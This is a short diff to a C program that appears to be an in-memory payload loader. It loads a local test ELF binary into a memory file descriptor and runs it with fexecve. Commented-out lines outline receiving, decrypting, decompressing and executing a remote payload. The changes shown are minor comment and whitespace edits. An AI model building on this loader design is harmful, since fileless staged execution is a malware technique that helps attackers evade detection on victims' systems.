@@ -7,7 +7,7 @@
 //#include <decrypt.h>
 //#include <execute.h>
 //#include <networking.h>
-
+// blablabla
 /*
     Get size in bytes of given file
 */
@@ -29,7 +29,7 @@ int main(int argc, char **argv){
     int write_return_size;
     const char * payload_argv[] = {"test_ELF", "hellohello", NULL}; // argv for payload
     const char * payload_envp[] = {NULL}; // envp for payload
-
+    
 /*
 
     while(receive(payload) != 0){
@@ -41,7 +41,7 @@ int main(int argc, char **argv){
     decompress(decrypted, decompressed);
     execute(decrypted);
 */
-
+    
     payload_file = fopen("./test_files/test_ELF", "r"); // open payload binary
     size = fsize(payload_file); // get size in bytes
     payload = calloc(size, sizeof(unsigned char)); // allocate on heap
@@ -60,7 +60,9 @@ int main(int argc, char **argv){
         printf("Writing to mem_fd failed. %d bytes written when %d bytes were supposed to be written.\n", write_return_size, size);
         return -1;
     }
-
+    /*
+        TODO: The executed process inherits the loaders directory as current dir. Change to /
+    */
     if (fexecve(payload_fd, (char * const *) payload_argv, (char * const *) payload_envp) == -1){ // execute payload
         puts("fexecve() failed");
     }
